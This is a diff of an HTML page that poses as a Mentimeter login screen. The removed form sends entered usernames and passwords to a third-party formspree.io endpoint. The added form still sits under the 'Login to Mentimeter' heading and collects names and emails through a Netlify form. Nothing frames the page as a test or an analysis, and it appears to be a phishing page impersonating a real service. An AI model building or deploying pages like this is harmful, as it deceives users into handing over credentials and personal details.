@@ -206,13 +206,20 @@ button:hover {
 
 <div class="login-container">
   <h2>Login to Mentimeter</h2>
-  <form action="https://formspree.io/f/mjgejnll" method="POST">
-    <input type="text" name="username" placeholder="Username" required />
-    <input type="password" name="password" placeholder="Password" required />
-    <button type="submit">Login</button>
-  </form>
+  <form name="simple" method="POST" data-netlify="true">
+  <input type="hidden" name="form-name" value="simple" />
+  
+  <label>Name:</label>
+  <input type="text" name="name" required />
+  
+  <label>Email:</label>
+  <input type="email" name="email" required />
+  
+  <button type="submit">Send</button>
+</form>
 </div>
 
 </body>
 
 </html>
+
